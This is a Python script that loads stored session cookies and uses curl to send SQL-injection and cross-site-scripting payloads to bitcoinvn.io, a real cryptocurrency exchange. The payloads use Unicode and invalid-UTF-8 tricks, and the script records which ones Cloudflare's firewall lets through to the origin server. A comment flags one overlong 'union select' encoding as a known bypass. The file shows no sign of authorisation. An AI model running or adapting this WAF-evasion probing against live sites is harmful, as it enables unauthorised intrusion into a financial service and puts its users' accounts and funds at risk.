import subprocess

BASE = "https://bitcoinvn.io"
pairs = []
for line in open("/workspace/jar.txt"):
    line = line.rstrip("\n")
    if not line.strip(): continue
    if line.startswith("#HttpOnly_"): line = line[len("#HttpOnly_"):]
    if line.startswith("#"): continue
    f = line.split("\t")
    pairs.append(f"{f[5]}={f[6]}")
CJ = "; ".join(pairs)
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

def probe(path):
    cmd = ["curl", "-s", "-D", "/tmp/h4.txt", "-o", "/dev/null", "--max-time", "12",
           "-H", f"Cookie: {CJ}", "-H", f"User-Agent: {UA}", "--path-as-is", BASE + path]
    subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    raw = open("/tmp/h4.txt").read()
    first = raw.split("\r\n")[0]
    parts = first.split(" ")
    code = parts[1] if len(parts) > 1 else "?"
    src = "ORIGIN" if "content-security-policy:" in raw.lower() else "CF-EDGE"
    return code, src

tests = [
 # Is the overlong bypass SPECIFIC to space substitution, or does CF just fail on any invalid UTF-8?
 ("ctrl char inside union   ", "/?q=union\x1bselect"),
 ("invalid utf8 C0 inside kw", "/?q=un%C0%AFion select"),
 ("overlong replaces SPACE  ", "/?q=union%C0%AFselect"),        # known BYPASS
 ("overlong + legit space mix", "/?q=union%C0%AFselect from"),
 ("fullwidth space U+3000   ", "/?q=union%E3%80%80select"),
 ("ideographic space        ", "/?q=union%E3%80%81select"),
 ("en-space U+2002          ", "/?q=union%E2%80%82select"),
 ("em-space U+2003          ", "/?q=union%E2%80%83select"),
 ("three-per-em U+2004      ", "/?q=union%E2%80%84select"),
 ("four-per-em U+2005       ", "/?q=union%E2%80%85select"),
 ("six-per-em U+2006        ", "/?q=union%E2%80%86select"),
 ("figure sp U+2007         ", "/?q=union%E2%80%87select"),
 ("punctuation sp U+2008    ", "/?q=union%E2%80%88select"),
 ("thin sp U+2009           ", "/?q=union%E2%80%89select"),
 ("hair sp U+200A           ", "/?q=union%E2%80%8Aselect"),
 ("line sep U+2028          ", "/?q=union%E2%80%A8select"),
 ("para sep U+2029          ", "/?q=union%E2%80%A9select"),
 ("LRE U+202A               ", "/?q=union%E2%80%AAselect"),
 ("RLO U+202E               ", "/?q=union%E2%80%AEselect"),
 ("word joiner U+2060       ", "/?q=union%E2%81%A0select"),
 ("invisible plus U+2064    ", "/?q=union%E2%81%A4select"),
 ("BOM U+FEFF prefix        ", "/?q=%EF%BB%BFunion%20select"),
 ("TAG chars U+E0020        ", "/?q=union%F3%A0%80%A0select"),
 # XSS with unicode tag-name tricks
 ("xss <script> fullwidth   ", "/?v=%EF%BC%9Cscript%EF%BC%9E"),
 ("xss <script> tag-char    ", "/?v=%3Cscript%F3%A0%80%A0%3E"),
 ("xss <img> nul            ", "/?v=%3Cimg%00src%3Dx%3E"),
 ("xss <svg> zwsp in name   ", "/?v=%3Csv%E2%80%8Bg%3E"),
 ("xss <svg onload>         ", "/?v=%3Csvg%20onload%3Dx%3E"),
 ("xss <svg onload> nbsp    ", "/?v=%3Csvg%C2%A0onload%3Dx%3E"),
 ("xss body background      ", "/?v=%3Cbody%20background%3Dx%3E"),
 ("xss details ontoggle     ", "/?v=%3Cdetails%20ontoggle%3Dx%3E"),
 ("xss marquee onstart      ", "/?v=%3Cmarquee%20onstart%3Dx%3E"),
 ("xss audio onerror        ", "/?v=%3Caudio%20onerror%3Dx%3E"),
 ("xss select onchange      ", "/?v=%3Cselect%20onchange%3Dx%3E"),
 ("xss isindex              ", "/?v=%3Cisindex%3E"),
]

print(f"{'TEST':<28} {'CODE':<5} RESULT")
print("-"*52)
for label, p in tests:
    c, s = probe(p)
    flag = "BLOCKED-BY-WAF" if s == "CF-EDGE" else "REACHED-ORIGIN"
    print(f"{label:<28} {c:<5} {flag}")
